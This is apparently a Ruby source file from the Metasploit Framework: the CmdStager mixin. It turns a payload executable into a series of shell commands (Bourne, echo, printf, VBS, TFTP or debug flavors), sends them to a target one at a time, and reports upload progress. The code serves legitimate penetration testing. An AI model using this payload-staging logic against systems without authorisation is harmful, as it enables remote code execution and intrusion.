# -*- coding: binary -*-

require 'rex/exploitation/cmdstager'
require 'msf/core/exploit/exe'

module Msf

###
#
# This mixin provides an interface to generating cmdstagers
#
###
module Exploit::CmdStager

  include Msf::Exploit::EXE

  #
  # Creates an instance of an exploit that uses an CmdStager overwrite.
  #
  def initialize(info = {})
    super
    @stager_instance = nil

    register_advanced_options(
      [
        OptString.new('CMDSTAGER::DECODERSTUB',  [ false, 'The decoder stub to use.', nil]),
      ], self.class)
  end


  #
  # Execute the command stager while showing the progress
  #
  def execute_cmdstager(opts = {})

    # Starts select the correct stager
    unless opts.include?(:flavor)
      default_flavor = guess_flavor
      vprint_status("Using default stager: #{default_flavor}")
      opts[:flavor] = default_flavor
    end

    unless opts.include?(:decoder)
      opts[:decoder] = datastore['CMDSTAGER::DECODERSTUB'] || guess_decoder(opts)
    end
    # Ends select the correct stager

    cmd_list = generate_cmdstager(opts)

    @stager_instance.setup(self)

    begin
      execute_cmdstager_begin(opts)


      sent = 0
      total_bytes = 0
      cmd_list.each { |cmd| total_bytes += cmd.length }

      delay = opts[:delay]
      delay ||= 0.25

      cmd_list.each do |cmd|
        execute_command(cmd, opts)
        sent += cmd.length

        # In cases where a server has multiple threads, we want to be sure that
        # commands we execute happen in the correct (serial) order.
        ::IO.select(nil, nil, nil, delay)

        progress(total_bytes, sent)
      end

      execute_cmdstager_end(opts)
    ensure
      @stager_instance.teardown
    end
  end


  #
  # Generates a cmd stub based on the current target's architecture
  # and operating system.
  #
  def generate_cmdstager(opts = {}, pl = nil)

    # starts Multi task
    unless opts.include?(:decoder)
      opts[:decoder] = datastore['CMDSTAGER::DECODERSTUB'] || guess_decoder(opts)
    end
    # ends Multi task

    pl ||= payload.encoded

    @exe = generate_payload_exe

    @stager_instance = create_stager(opts)
    cmd_list = @stager_instance.generate(opts)

    if (cmd_list.nil? or cmd_list.length < 1)
      print_error("The command stager could not be generated")
      raise ArgumentError
    end

    @cmd_list = cmd_list
  end


  #
  # Show the progress of the upload
  #
  def progress(total, sent)
    done = (sent.to_f / total.to_f) * 100
    percent = "%3.2f%%" % done.to_f
    print_status("Command Stager progress - %7s done (%d/%d bytes)" % [percent, sent, total])
  end

  def create_stager(opts)
    case opts[:flavor]
    when :bourne
      return Rex::Exploitation::CmdStagerBourne.new(@exe)
    when :debug_asm
      return Rex::Exploitation::CmdStagerDebugAsm.new(@exe)
    when :debug_write
      return Rex::Exploitation::CmdStagerDebugWrite.new(@exe)
    when :echo
      return Rex::Exploitation::CmdStagerEcho.new(@exe)
    when :printf
      return Rex::Exploitation::CmdStagerPrintf.new(@exe)
    when :vbs, :vbs_adodb
      return Rex::Exploitation::CmdStagerVBS.new(@exe)
    when :tftp
      return Rex::Exploitation::CmdStagerTFTP.new(@exe)
    end
  end

  def guess_decoder(opts)
    case opts[:flavor]
    when :debug_asm
      return File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "debug_asm")
    when :debug_write
      return File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "debug_write")
    when :vbs
      return File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64")
    when :vbs_adodb
      return File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64_adodb")
    end
    return nil
  end

  def guess_flavor
    c_platform = nil
    if target_platform.names.length == 1
      c_platform = target_platform.names.first
    end
    case c_platform
    when 'linux', 'Linux'
      return :bourne
    when 'osx', 'OSX'
      return :bourne
    when 'unix', 'Unix'
      return :bourne
    when 'win', 'Windows'
      return :vbs
    end
    return nil
  end

  #
  # Methods to override - not used internally
  #
  def execute_cmdstager_begin(opts)
  end
  def execute_cmdstager_end(opts)
  end

end

end
